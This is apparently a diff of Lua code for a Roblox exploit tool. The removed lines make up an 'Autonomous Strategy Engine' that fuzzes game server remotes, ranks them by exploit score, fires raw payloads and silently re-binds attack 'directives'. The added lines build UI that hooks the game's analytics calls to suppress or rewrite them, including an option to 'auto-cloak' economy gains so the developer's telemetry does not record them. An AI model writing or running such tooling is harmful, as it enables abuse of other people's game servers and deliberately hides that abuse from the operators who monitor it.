-    local feedbackRemote = goal.params.feedbackRemote
-    local SBI            = _G.PC.SBI
-    local APE            = _G.PC.APE
-
-    if not sinkRemote then error("sinkRemote required for RECOMPILE") end
-
-    print(string.format("[ASE] RECOMPILE: beginning drift recovery for %s", sinkRemote))
-    ASE_AppendTx({
-        directive  = "RECOMPILE: " .. sinkRemote,
-        rawPayload = {},
-        result     = "Drift detected — entering raw re-fuzz",
-    })
-
-    -- Step 1: Clear APE saturation so it re-probes
-    local satState = APE and APE.GetSaturation(sinkRemote)
-    if satState and satState.saturated then
-        -- Force re-probe by resetting CSK stability note
-        local CSK = _G.PC.CSK
-        if CSK then
-            CSK.Annotate(sinkRemote, "RECOMPILE: saturation cleared for drift recovery")
-        end
-    end
-
-    -- Step 2: Run targeted APE campaign focused on validation
-    if APE then
-        local id, err = APE.StartCampaign(sinkRemote)
-        if id then
-            -- Wait up to 60s for campaign to yield new data
-            local t0 = os.clock()
-            local campaignDone = false
-            while not campaignDone and os.clock()-t0 < 60 do
-                task.wait(2)
-                local campaigns = APE.GetCampaigns()
-                for _, c in ipairs(campaigns) do
-                    if c.id == id and (c.status == "COMPLETE" or c.status == "SATURATED") then
-                        campaignDone = true; break
-                    end
-                end
-                if goal.status == ASE.STATUS.ABORTED then return end
-            end
-        end
-    end
-
-    -- Step 3: Force SBI rebuild with new probe data
-    if SBI then pcall(SBI.Rebuild) end
-    task.wait(1.0)
-
-    -- Step 4: Attempt Bedrock re-handshake
-    local rehandshakeGoal = ASE_NewGoal(ASE.GOAL.BEDROCK, {
-        sinkRemote = sinkRemote,
-        cargo      = goal.params.cargo or {},
-    })
-    ASE_BedrockHandshake.Run(rehandshakeGoal)
-
-    if rehandshakeGoal.result and rehandshakeGoal.result.confirmed then
-        goal.result = { recovered=true, newFeedback=rehandshakeGoal.result.feedbackRemote }
-        -- Re-bind all directives for this sink
-        for name, dir in pairs(ASE_Directives) do
-            if dir.sinkRemote == sinkRemote then
-                print(string.format("[ASE] Silent re-bind: directive '%s' on recovered pipeline.", name))
-            end
-        end
-        ASE_AppendTx({
-            directive  = "RECOMPILE COMPLETE",
-            rawPayload = {},
-            result     = "✓ Pipeline recovered — directives re-bound silently",
-        })
-    else
-        goal.result = { recovered=false }
-        ASE_AppendTx({
-            directive  = "RECOMPILE FAILED",
-            rawPayload = {},
-            result     = "✗ Could not re-establish pipeline — manual investigation required",
-        })
-    end
-end
-
--- SBI drift monitor: called on every SBI rebuild
-function ASE_RecompileEngine.CheckDrift()
-    if not ASE.Panel.Visible or not ASE.Panel.ActiveSink then return end
-    local sinkRemote = ASE.Panel.ActiveSink
-    local SBI        = _G.PC.SBI
-    local sbiRec     = SBI and SBI.Get(sinkRemote)
-    if not sbiRec then return end
-
-    local pair = ASE_BedrockPairs[sinkRemote]
-    if not pair then return end
-
-    -- Check if confidence regressed significantly since confirmation
-    if pair.confidence >= 0.8 and sbiRec.Confidence < (pair.confidence - ASE_CFG.DriftThreshold) then
-        warn(string.format("[ASE] Drift detected on %s: conf %.2f→%.2f",
-            sinkRemote, pair.confidence, sbiRec.Confidence))
-        if ASE_Mode == ASE.MODE.MASTERY then
-            ASE_GoalEngine.Push(ASE.GOAL.RECOMPILE, { sinkRemote=sinkRemote })
-        end
-    end
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 6 — RISK BUDGET
--- ═════════════════════════════════════════════════════════════
-
-function ASE.GetRiskBudget()
-    return {
-        total     = ASE_CFG.SessionRiskBudget,
-        consumed  = ASE_RiskConsumed,
-        remaining = math.max(0, ASE_CFG.SessionRiskBudget - ASE_RiskConsumed),
-        pct       = ASE_RiskConsumed / ASE_CFG.SessionRiskBudget,
-    }
-end
-
-function ASE.ResetRiskBudget()
-    ASE_RiskConsumed = 0.0
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 7 — EXECUTION PANEL CONTROLLER
--- ═════════════════════════════════════════════════════════════
-
-function ASE.SetMode(mode)
-    if mode == ASE.MODE.MASTERY and not ASE_MasteryUnlocked then
-        return false, "Autonomous Mastery not unlocked"
-    end
-    ASE_Mode              = mode
-    ASE.Panel.Mode        = mode
-    ASE.Panel.ForgeExpanded = (mode == ASE.MODE.RAW or mode == ASE.MODE.MASTERY)
-    return true
-end
-
-function ASE.UnlockMastery(passphrase)
-    local REQUIRED = "I am responsible for my actions"
-    if passphrase == REQUIRED then
-        ASE_MasteryUnlocked   = true
-        ASE.Panel.MasteryUnlocked = true
-        print("[ASE] Autonomous Mastery unlocked.")
-        return true
-    end
-    return false
-end
-
-function ASE.IsMasteryUnlocked()
-    return ASE_MasteryUnlocked
-end
-
--- ═════════════════════════════════════════════════════════════
--- PUBLIC API
--- ═════════════════════════════════════════════════════════════
-
--- Linger escalation entry point: called by AVD Operator when SARP returns LINGERED
--- Triggers VERIFY_TOPOLOGICAL_CIRCUIT to confirm whether the linger means
--- the server is acting as a steering proxy (Bedrock) or just slow (Warm Lead only)
-function ASE.OnLingerConfirmed(remoteName, sarpResult)
-    if not remoteName then return end
-
-    -- Deduplicate: skip if already verifying this remote
-    if ASE_LingerPending[remoteName] then
-        return
-    end
-
-    -- Skip if already a confirmed Bedrock pair with live heartbeat
-    local existing = ASE_BedrockPairs[remoteName]
-    if existing and existing.confidence >= 0.8 and ASE.Panel.HeartbeatAlive then
-        return
-    end
-
-    print(string.format(
-        "[ASE] LINGER confirmed on %s — queuing VERIFY_TOPOLOGICAL_CIRCUIT.", remoteName))
-
-    -- Start linger watch immediately — before VERIFY runs — so we capture
-    -- any property deltas that occur in the linger window
-    ASE_LingerWatch.Start(remoteName)
-
-    ASE_LingerPending[remoteName] = true
-    ASE_GoalEngine.Push(ASE.GOAL.VERIFY, { remoteName=remoteName, sarpResult=sarpResult })
-end
-
--- Goal API
-function ASE.PursueBedrock(sinkRemote, cargo)
-    return ASE_GoalEngine.Push(ASE.GOAL.BEDROCK, {
-        sinkRemote = sinkRemote,
-        cargo      = cargo or {},
-    })
-end
-
-function ASE.FinalizeDirective(name, envelope, sinkRemote, category, params, watchTargets)
-    return ASE_GoalEngine.Push(ASE.GOAL.FINALIZE, {
-        name         = name,
-        envelope     = envelope,
-        sinkRemote   = sinkRemote,
-        category     = category,
-        parameters   = params,
-        watchTargets = watchTargets,
-    })
-end
-
-function ASE.Recompile(sinkRemote)
-    return ASE_GoalEngine.Push(ASE.GOAL.RECOMPILE, { sinkRemote=sinkRemote })
-end
-
-function ASE.Discover(remoteName)
-    return ASE_GoalEngine.Push(ASE.GOAL.DISCOVER, { remoteName=remoteName })
-end
-
--- Directive execution
-function ASE.Execute(intentName, args)
-    return ASE_DirectiveCompiler.Execute(intentName, args)
-end
-
--- Raw fire
-function ASE.FireRaw(sinkRemote, rawArgs)
-    if ASE_Mode == ASE.MODE.COMPILED then
-        return false, "Switch to Raw or Mastery mode first"
-    end
-    ASE_ConsumeRisk("RAW_FIRE")
-    return ASE_ForgeEngine.FireRaw(sinkRemote, rawArgs)
-end
-
--- Forge utilities
-function ASE.ParseByteString(str)   return ASE_ForgeEngine.ParseByteString(str) end
-function ASE.ToByteString(t)        return ASE_ForgeEngine.ToByteString(t) end
-
--- Getters
-function ASE.GetGoals()
-    local out = {}
-    for _, g in pairs(ASE_Goals) do table.insert(out, g) end
-    table.sort(out, function(a,b) return a.id > b.id end)
-    return out
-end
-
-function ASE.GetBedrockPairs()
-    local out = {}
-    for _, p in pairs(ASE_BedrockPairs) do table.insert(out, p) end
-    return out
-end
-
-function ASE.GetDirectives()
-    local out = {}
-    for _, d in pairs(ASE_Directives) do table.insert(out, d) end
-    table.sort(out, function(a,b) return (a.confirmedAt or 0) > (b.confirmedAt or 0) end)
-    return out
-end
-
-function ASE.GetTxBuffer(n)
-    local out = {}
-    for i = 1, math.min(n or 32, #ASE.Panel.TxBuffer) do
-        table.insert(out, ASE.Panel.TxBuffer[i])
-    end
-    return out
-end
-
-function ASE.GetMode()    return ASE_Mode end
-function ASE.GetStats()
-    return {
-        Mode            = ASE_Mode,
-        MasteryUnlocked = ASE_MasteryUnlocked,
-        PanelVisible    = ASE.Panel.Visible,
-        ActiveSink      = ASE.Panel.ActiveSink,
-        ActiveFeedback  = ASE.Panel.ActiveFeedback,
-        HeartbeatAlive  = ASE.Panel.HeartbeatAlive,
-        BedrockConf     = ASE.Panel.BedrockConf,
-        GoalCount       = (function() local n=0; for _ in pairs(ASE_Goals) do n=n+1 end; return n end)(),
-        ActiveGoals     = ASE_ActiveCount,
-        DirectiveCount  = (function() local n=0; for _ in pairs(ASE_Directives) do n=n+1 end; return n end)(),
-        RiskConsumed    = ASE_RiskConsumed,
-        RiskRemaining   = math.max(0, ASE_CFG.SessionRiskBudget - ASE_RiskConsumed),
-    }
-end
-
--- AVD finding hook: auto-assess if a new finding is a Bedrock candidate
-function ASE.OnAVDFinding(finding)
-    if not finding or not finding.remoteName then return end
-    local score = finding.exploitScore or 0
-    if score < ASE_CFG.BedrockThreshold then return end
-
-    local name = finding.remoteName
-    local now  = os.clock()
-
-    -- Debounce: skip if we already queued a DISCOVER for this remote recently
-    local lastPush = ASE_DiscoverCooldown[name] or 0
-    if (now - lastPush) < ASE_DISCOVER_COOLDOWN_S then return end
-
-    -- Skip if a DISCOVER goal for this remote is already pending/running
-    for _, g in pairs(ASE_Goals) do
-        if g.goalType == ASE.GOAL.DISCOVER
-           and g.params.remoteName == name
-           and (g.status == ASE.STATUS.PENDING or g.status == ASE.STATUS.RUNNING) then
-            return
-        end
-    end
-
-    ASE_DiscoverCooldown[name] = now
-    print(string.format("[ASE] AVD finding on %s (score=%.2f) — Bedrock candidate queued.",
-        name, score))
-    ASE_GoalEngine.Push(ASE.GOAL.DISCOVER, { remoteName=name })
-end
-
--- Persistence
-function ASE.Save()
-    local function safe(t)
-        if type(t) ~= "table" then return t end
-        local o = {}
-        for k,v in pairs(t) do
-            if type(k)=="string" or type(k)=="number" then
-                local sv = safe(v)
-                if sv ~= nil then o[k] = sv end
-            end
-        end
-        return o
-    end
-    pcall(function()
-        _G[ASE_CFG.PersistKey] = {
-            PersistVer      = ASE_CFG.PersistVer,
-            MasteryUnlocked = ASE_MasteryUnlocked,
-            Directives      = safe(ASE_Directives),
-            BedrockPairs    = safe(ASE_BedrockPairs),
-        }
-    end)
-end
-
-function ASE.Load()
-    pcall(function()
-        local d = _G[ASE_CFG.PersistKey]
-        if type(d) ~= "table" or d.PersistVer ~= ASE_CFG.PersistVer then return end
-        ASE_MasteryUnlocked       = d.MasteryUnlocked or false
-        ASE.Panel.MasteryUnlocked = ASE_MasteryUnlocked
-        if type(d.Directives) == "table" then
-            for k, v in pairs(d.Directives) do ASE_Directives[k] = v end
-        end
-        if type(d.BedrockPairs) == "table" then
-            for k, v in pairs(d.BedrockPairs) do
-                v.confidence = 0.0  -- require re-verification on load
-                ASE_BedrockPairs[k] = v
-            end
-        end
-        print(string.format("[ASE] Loaded: %d directives, mastery=%s",
-            (function() local n=0; for _ in pairs(ASE_Directives) do n=n+1 end; return n end)(),
-            tostring(ASE_MasteryUnlocked)))
-    end)
-end
-
--- ═════════════════════════════════════════════════════════════
--- STARTUP
--- ═════════════════════════════════════════════════════════════
-task.spawn(function()
-    local function waitFor(getter, label, timeout)
-        local t0 = os.clock()
-        while not getter() do
-            if os.clock()-t0 > timeout then
-                warn("[ASE] Timeout waiting for "..label); return false
-            end
-            task.wait(0.5)
-        end
-        return true
-    end
-
-    waitFor(function() return _G.PC.SBI  end, "SBI",  40)
-    waitFor(function() return _G.PC.SARP end, "SARP", 35)
-    waitFor(function() return _G.PC.APE  end, "APE",  45)
-    waitFor(function() return _G.PC.CSK  end, "CSK",  45)
-    waitFor(function() return _G.PC.TSR  end, "TSR",  45)
-
-    ASE.Load()
-    ASE_Running = true
-
-    -- Hook AVD Strategist for finding notifications
-    task.wait(1.0)
-    local strat = _G.PC.AVD and _G.PC.AVD.Strategist
-    if strat then
-        local origOnReport = strat.OnReport
-        local _seenFindings = {}  -- track which remotes we've already acted on
-        strat.OnReport = function(report)
-            if origOnReport then origOnReport(report) end
-            -- Only act on findings that have score >= threshold
-            -- Debounce is inside OnAVDFinding, but avoid iterating every tick
-            -- by only calling it if the report itself signals a high-value finding
-            if not report or not report.signal or report.signal < 0.55 then return end
-            local findings = strat.GetFindings and strat.GetFindings(0.70) or {}
-            for _, f in ipairs(findings) do
-                pcall(ASE.OnAVDFinding, f)
-            end
-        end
-        print("[ASE] Hooked AVD Strategist.OnReport")
-    end
-
-    -- Set Bedrock candidate threshold
-    ASE_CFG.BedrockThreshold = 0.75
-
-    print("[ASE] Autonomous Strategy Engine ready.")
-    print(string.format("[ASE] Mode: %s | Mastery: %s",
-        ASE_Mode, tostring(ASE_MasteryUnlocked)))
+    hookStatusLabel.Text = ASE.HookInstalled and "Hook active" or "Hook not installed"
+    hookStatusLabel.TextColor3 = ASE.HookInstalled
+        and Color3.fromRGB(60,160,80) or Color3.fromRGB(180,60,60)
 end)
 
--- ── Export ────────────────────────────────────────────────────
+-- Mode toggle row
+local modeRow = gseRow(sASEMode)
+local btnPass  = gseBtn(modeRow, "👁 Passthrough",
+    ASE.HookMode=="PASSTHROUGH"  and C.ASE_PASS or C.BTN, C.BTNHOV, 1)
+local btnMod   = gseBtn(modeRow, "✏ Modify",
+    ASE.HookMode=="MODIFY"       and C.ASE_MOD  or C.BTN, C.BTNHOV, 2)
+local btnSupAll= gseBtn(modeRow, "🚫 Suppress All",
+    ASE.HookMode=="SUPPRESS_ALL" and C.ASE_SUP  or C.BTN, C.BTNHOV, 3)
+
+local modeLabel = gseLabel(modeRow, "Mode: " .. ASE.HookMode, 11, true, C.SUBTEXT)
+
+local function ASE_SetMode(mode)
+    ASE.HookMode = mode; ASE_Save()
+    modeLabel.Text = "Mode: " .. mode
+    tween(btnPass,   TweenInfo.new(0.12), {BackgroundColor3 = mode=="PASSTHROUGH"  and C.ASE_PASS or C.BTN})
+    tween(btnMod,    TweenInfo.new(0.12), {BackgroundColor3 = mode=="MODIFY"       and C.ASE_MOD  or C.BTN})
+    tween(btnSupAll, TweenInfo.new(0.12), {BackgroundColor3 = mode=="SUPPRESS_ALL" and C.ASE_SUP  or C.BTN})
+    GSE_Log("ASE", "Hook mode → " .. mode)
+end
+
+btnPass.MouseButton1Click:Connect(function()   ASE_SetMode("PASSTHROUGH")  end)
+btnMod.MouseButton1Click:Connect(function()    ASE_SetMode("MODIFY")       end)
+btnSupAll.MouseButton1Click:Connect(function() ASE_SetMode("SUPPRESS_ALL") end)
+
+-- Cloak threshold row
+local cloakRow = gseRow(sASEMode)
+gseLabel(cloakRow, "Auto-cloak economy gains above:", 11, false, C.SUBTEXT)
+local cloakInput = mk("TextBox",{
+    BackgroundColor3=C.INPUT, BorderSizePixel=0,
+    Font=Enum.Font.GothamMono,
+    PlaceholderText="0 = disabled",
+    PlaceholderColor3=C.SUBTEXT,
+    Text=ASE.CloakThreshold > 0 and tostring(ASE.CloakThreshold) or "",
+    TextColor3=C.TEXT, TextSize=11,
+    Size=UDim2.new(0,120,0,26),
+    TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=cloakRow,
+})
+addCorner(cloakInput, UDim.new(0,6)); addStroke(cloakInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),Parent=cloakInput})
+
+cloakInput.FocusLost:Connect(function()
+    ASE.CloakThreshold = tonumber(cloakInput.Text) or 0
+    ASE_Save()
+    GSE_Log("ASE", "Cloak threshold → " ..
+            (ASE.CloakThreshold > 0 and tostring(ASE.CloakThreshold) or "disabled"))
+end)
+
+gseLabel(cloakRow, "(suppresses FireEconomyEvent source calls silently)", 10, false, C.SUBTEXT)
+
+-- ============================================================
+-- UI — SECTION: Suppression Rules
+-- ============================================================
+local _, sASESup = makeSection(pageGSE, "🚫  Suppression Rules")
+
+gseLabel(sASESup,
+    "Drop specific analytics calls before they reach the service.\n" ..
+    "Match by method + argument index + pattern string.",
+    11, false, C.SUBTEXT)
+
+-- Rule list
+local supRuleList = mk("Frame",{
+    BackgroundColor3=C.INPUT, BorderSizePixel=0,
+    Size=UDim2.new(1,-16,0,0), AutomaticSize=Enum.AutomaticSize.Y,
+    ClipsDescendants=false, Parent=sASESup,
+})
+addCorner(supRuleList, UDim.new(0,8)); addStroke(supRuleList, 1, 0.4)
+mk("UIListLayout",{Padding=UDim.new(0,3),
+    SortOrder=Enum.SortOrder.LayoutOrder, Parent=supRuleList})
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8),
+    PaddingTop=UDim.new(0,4),PaddingBottom=UDim.new(0,4),Parent=supRuleList})
+
+local supEmpty = gseLabel(supRuleList, "No suppression rules defined.", 11, false, C.SUBTEXT)
+
+local function ASE_RebuildSupRules()
+    for _, ch in ipairs(supRuleList:GetChildren()) do
+        if ch:IsA("Frame") then ch:Destroy() end
+    end
+    local count = 0
+    for i, rule in ipairs(ASE.SuppressionRules) do
+        count = count + 1
+        local row = mk("Frame",{BackgroundTransparency=1,
+            Size=UDim2.new(1,0,0,26), LayoutOrder=i, Parent=supRuleList})
+        mk("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,
+            VerticalAlignment=Enum.VerticalAlignment.Center,
+            Padding=UDim.new(0,6), Parent=row})
+
+        local function badge(text, bg)
+            local b = mk("TextLabel",{BackgroundColor3=bg,BorderSizePixel=0,
+                Font=Enum.Font.GothamMono, Text=text, TextColor3=C.TEXT,
+                TextSize=9, AutomaticSize=Enum.AutomaticSize.X,
+                Size=UDim2.new(0,0,0,18), Parent=row})
+            addCorner(b, UDim.new(0,4))
+            mk("UIPadding",{PaddingLeft=UDim.new(0,4),PaddingRight=UDim.new(0,4),Parent=b})
+        end
+
+        badge(rule.method, C.ASE_SUP)
+        badge("arg" .. rule.field, Color3.fromRGB(245,235,220))
+        badge('"' .. rule.pattern .. '"', Color3.fromRGB(235,215,215))
+
+        -- Delete button
+        local idx = i
+        local btnDel = mk("TextButton",{AutoButtonColor=false,
+            BackgroundColor3=Color3.fromRGB(240,200,195),
+            BorderSizePixel=0, Font=Enum.Font.GothamBold,
+            Text="✕", TextColor3=Color3.fromRGB(160,40,40), TextSize=11,
+            Size=UDim2.new(0,22,0,22), Parent=row,
+        })
+        addCorner(btnDel, UDim.new(0,6))
+        btnDel.MouseButton1Click:Connect(function()
+            table.remove(ASE.SuppressionRules, idx)
+            ASE_Save(); ASE_RebuildSupRules()
+            GSE_Log("ASE", "Suppression rule removed")
+        end)
+    end
+    supEmpty.Visible = (count == 0)
+end
+
+ASE_RebuildSupRules()
+
+-- Add rule form
+local supAddRow = gseRow(sASESup)
+
+local supMethodDropStr = {"ALL","FireCustomEvent","FireLogEvent",
+                           "FireEconomyEvent","FireProgressionEvent"}
+local supMethodIdx = 1
+
+local btnSupMethod = mk("TextButton",{AutoButtonColor=false,
+    BackgroundColor3=C.ASE_SUP, BorderSizePixel=0,
+    Font=Enum.Font.GothamSemibold, Text=supMethodDropStr[supMethodIdx],
+    TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,140,0,26), Parent=supAddRow,
+})
+addCorner(btnSupMethod, UDim.new(0,7)); addStroke(btnSupMethod, 1, 0.4)
+btnSupMethod.MouseButton1Click:Connect(function()
+    supMethodIdx = (supMethodIdx % #supMethodDropStr) + 1
+    btnSupMethod.Text = supMethodDropStr[supMethodIdx]
+end)
+
+local supFieldInput = mk("TextBox",{BackgroundColor3=C.INPUT,BorderSizePixel=0,
+    Font=Enum.Font.GothamMono, PlaceholderText="arg#",
+    PlaceholderColor3=C.SUBTEXT, Text="", TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,46,0,26), TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=supAddRow,
+})
+addCorner(supFieldInput, UDim.new(0,6)); addStroke(supFieldInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,5),Parent=supFieldInput})
+
+local supPatternInput = mk("TextBox",{BackgroundColor3=C.INPUT,BorderSizePixel=0,
+    Font=Enum.Font.GothamMono, PlaceholderText="pattern",
+    PlaceholderColor3=C.SUBTEXT, Text="", TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,100,0,26), TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=supAddRow,
+})
+addCorner(supPatternInput, UDim.new(0,6)); addStroke(supPatternInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,5),Parent=supPatternInput})
+
+local btnAddSup = gseBtn(supAddRow, "+ Add Rule", C.ASE_SUP,
+    Color3.fromRGB(248,210,210), 4)
+btnAddSup.Size = UDim2.new(0,80,0,26)
+
+btnAddSup.MouseButton1Click:Connect(function()
+    local field   = supFieldInput.Text == "" and "ALL" or supFieldInput.Text
+    local pattern = supPatternInput.Text
+    if pattern == "" then GSE_Log("WARN", "Pattern cannot be empty"); return end
+    table.insert(ASE.SuppressionRules, {
+        method  = supMethodDropStr[supMethodIdx],
+        field   = field,
+        pattern = pattern,
+    })
+    ASE_Save(); ASE_RebuildSupRules()
+    supFieldInput.Text = ""; supPatternInput.Text = ""
+    GSE_Log("ASE", "Suppression rule added: " ..
+            supMethodDropStr[supMethodIdx] ..
+            " arg=" .. field .. " pattern=" .. pattern)
+end)
+
+-- ============================================================
+-- UI — SECTION: Modification Rules
+-- ============================================================
+local _, sASEMod = makeSection(pageGSE, "✏️  Modification Rules")
+
+gseLabel(sASEMod,
+    "Rewrite specific argument values before the call fires.\n" ..
+    "Active only in Modify mode. Pattern-matched, replacement applied.",
+    11, false, C.SUBTEXT)
+
+local modRuleList = mk("Frame",{
+    BackgroundColor3=C.INPUT, BorderSizePixel=0,
+    Size=UDim2.new(1,-16,0,0), AutomaticSize=Enum.AutomaticSize.Y,
+    ClipsDescendants=false, Parent=sASEMod,
+})
+addCorner(modRuleList, UDim.new(0,8)); addStroke(modRuleList, 1, 0.4)
+mk("UIListLayout",{Padding=UDim.new(0,3),
+    SortOrder=Enum.SortOrder.LayoutOrder, Parent=modRuleList})
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8),
+    PaddingTop=UDim.new(0,4),PaddingBottom=UDim.new(0,4),Parent=modRuleList})
+
+local modEmpty = gseLabel(modRuleList, "No modification rules defined.", 11, false, C.SUBTEXT)
+
+local function ASE_RebuildModRules()
+    for _, ch in ipairs(modRuleList:GetChildren()) do
+        if ch:IsA("Frame") then ch:Destroy() end
+    end
+    local count = 0
+    for i, rule in ipairs(ASE.ModRules) do
+        count = count + 1
+        local row = mk("Frame",{BackgroundTransparency=1,
+            Size=UDim2.new(1,0,0,26), LayoutOrder=i, Parent=modRuleList})
+        mk("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,
+            VerticalAlignment=Enum.VerticalAlignment.Center,
+            Padding=UDim.new(0,5), Parent=row})
+
+        local function badge(text, bg)
+            local b = mk("TextLabel",{BackgroundColor3=bg,BorderSizePixel=0,
+                Font=Enum.Font.GothamMono, Text=text, TextColor3=C.TEXT,
+                TextSize=9, AutomaticSize=Enum.AutomaticSize.X,
+                Size=UDim2.new(0,0,0,18), Parent=row})
+            addCorner(b, UDim.new(0,4))
+            mk("UIPadding",{PaddingLeft=UDim.new(0,4),PaddingRight=UDim.new(0,4),Parent=b})
+        end
+
+        badge(rule.method, C.ASE_MOD)
+        badge("arg" .. rule.field, Color3.fromRGB(230,238,250))
+        badge('"' .. rule.pattern .. '"', Color3.fromRGB(220,230,248))
+        gseLabel(row, "→", 10, true, C.SUBTEXT)
+        badge('"' .. rule.replacement .. '"', Color3.fromRGB(210,240,215))
+
+        local idx = i
+        local btnDel = mk("TextButton",{AutoButtonColor=false,
+            BackgroundColor3=Color3.fromRGB(240,200,195),
+            BorderSizePixel=0, Font=Enum.Font.GothamBold,
+            Text="✕", TextColor3=Color3.fromRGB(160,40,40), TextSize=11,
+            Size=UDim2.new(0,22,0,22), Parent=row,
+        })
+        addCorner(btnDel, UDim.new(0,6))
+        btnDel.MouseButton1Click:Connect(function()
+            table.remove(ASE.ModRules, idx)
+            ASE_Save(); ASE_RebuildModRules()
+            GSE_Log("ASE", "Modification rule removed")
+        end)
+    end
+    modEmpty.Visible = (count == 0)
+end
+
+ASE_RebuildModRules()
+
+-- Add mod rule form
+local modAddRow = gseRow(sASEMod)
+
+local modMethodDropStr = {"ALL","FireCustomEvent","FireLogEvent",
+                           "FireEconomyEvent","FireProgressionEvent"}
+local modMethodIdx = 1
+
+local btnModMethod = mk("TextButton",{AutoButtonColor=false,
+    BackgroundColor3=C.ASE_MOD, BorderSizePixel=0,
+    Font=Enum.Font.GothamSemibold, Text=modMethodDropStr[modMethodIdx],
+    TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,140,0,26), Parent=modAddRow,
+})
+addCorner(btnModMethod, UDim.new(0,7)); addStroke(btnModMethod, 1, 0.4)
+btnModMethod.MouseButton1Click:Connect(function()
+    modMethodIdx = (modMethodIdx % #modMethodDropStr) + 1
+    btnModMethod.Text = modMethodDropStr[modMethodIdx]
+end)
+
+local modFieldInput = mk("TextBox",{BackgroundColor3=C.INPUT,BorderSizePixel=0,
+    Font=Enum.Font.GothamMono, PlaceholderText="arg#",
+    PlaceholderColor3=C.SUBTEXT, Text="", TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,40,0,26), TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=modAddRow,
+})
+addCorner(modFieldInput, UDim.new(0,6)); addStroke(modFieldInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,5),Parent=modFieldInput})
+
+local modPatternInput = mk("TextBox",{BackgroundColor3=C.INPUT,BorderSizePixel=0,
+    Font=Enum.Font.GothamMono, PlaceholderText="match",
+    PlaceholderColor3=C.SUBTEXT, Text="", TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,80,0,26), TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=modAddRow,
+})
+addCorner(modPatternInput, UDim.new(0,6)); addStroke(modPatternInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,5),Parent=modPatternInput})
+
+local modReplInput = mk("TextBox",{BackgroundColor3=C.INPUT,BorderSizePixel=0,
+    Font=Enum.Font.GothamMono, PlaceholderText="replace",
+    PlaceholderColor3=C.SUBTEXT, Text="", TextColor3=C.TEXT, TextSize=10,
+    Size=UDim2.new(0,80,0,26), TextXAlignment=Enum.TextXAlignment.Left,
+    ClearTextOnFocus=false, Parent=modAddRow,
+})
+addCorner(modReplInput, UDim.new(0,6)); addStroke(modReplInput, 1, 0.45)
+mk("UIPadding",{PaddingLeft=UDim.new(0,5),Parent=modReplInput})
+
+local btnAddMod = gseBtn(modAddRow, "+ Add", C.ASE_MOD,
+    Color3.fromRGB(205,220,248), 5)
+btnAddMod.Size = UDim2.new(0,60,0,26)
+
+btnAddMod.MouseButton1Click:Connect(function()
+    local field   = modFieldInput.Text == "" and "ALL" or modFieldInput.Text
+    local pattern = modPatternInput.Text
+    local repl    = modReplInput.Text
+    if pattern == "" then GSE_Log("WARN", "Pattern cannot be empty"); return end
+    if repl    == "" then GSE_Log("WARN", "Replacement cannot be empty"); return end
+    table.insert(ASE.ModRules, {
+        method      = modMethodDropStr[modMethodIdx],
+        field       = field,
+        pattern     = pattern,
+        replacement = repl,
+    })
+    ASE_Save(); ASE_RebuildModRules()
+    modFieldInput.Text = ""; modPatternInput.Text = ""; modReplInput.Text = ""
+    GSE_Log("ASE", "Mod rule added: " ..
+            modMethodDropStr[modMethodIdx] ..
+            " arg=" .. field ..
+            " \"" .. pattern .. "\" → \"" .. repl .. "\"")
+end)
+
+-- ============================================================
+-- UI — SECTION: Economy Ledger
+-- ============================================================
+local _, sASELedger = makeSection(pageGSE, "💰  Economy Ledger")
+
+gseLabel(sASELedger,
+    "Built automatically from FireEconomyEvent calls. Shows every item SKU the\n" ..
+    "game tracks, total gains (Source) and spends (Sink), and call count.",
+    11, false, C.SUBTEXT)
+
+local ledgerClearRow = gseRow(sASELedger)
+local btnLedgerClear = gseBtn(ledgerClearRow, "🗑 Clear Ledger", C.BTN, C.BTNHOV, 1)
+local ledgerCountLbl = gseLabel(ledgerClearRow, "0 items", 11, false, C.SUBTEXT)
+
+-- Ledger table header
+local ledgerHeader = mk("Frame",{BackgroundColor3=Color3.fromRGB(240,232,218),
+    BorderSizePixel=0, Size=UDim2.new(1,-16,0,22), Parent=sASELedger})
+addCorner(ledgerHeader, UDim.new(0,6))
+mk("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal, Parent=ledgerHeader})
+mk("UIPadding",{PaddingLeft=UDim.new(0,8),Parent=ledgerHeader})
+
+local function hdrCell(text, w)
+    mk("TextLabel",{BackgroundTransparency=1, Font=Enum.Font.GothamBold,
+        Text=text, TextColor3=C.SUBTEXT, TextSize=9,
+        Size=UDim2.new(0,w,1,0), TextXAlignment=Enum.TextXAlignment.Left,
+        Parent=ledgerHeader})
+end
+
+hdrCell("ITEM SKU",    160)
+hdrCell("CURRENCY",    70)
+hdrCell("▲ SOURCE",    80)
+hdrCell("▼ SINK",      80)
+hdrCell("NET",         70)
+hdrCell("CALLS",       45)
+
+-- Ledger scroll
+local ledgerScroll = mk("ScrollingFrame",{
+    BackgroundColor3=C.INPUT, BorderSizePixel=0,
+    Size=UDim2.new(1,-16,0,160),
+    CanvasSize=UDim2.new(0,0,0,0), AutomaticCanvasSize=Enum.AutomaticSize.Y,
+    ScrollBarThickness=5, ScrollingDirection=Enum.ScrollingDirection.Y,
+    Parent=sASELedger,
+})
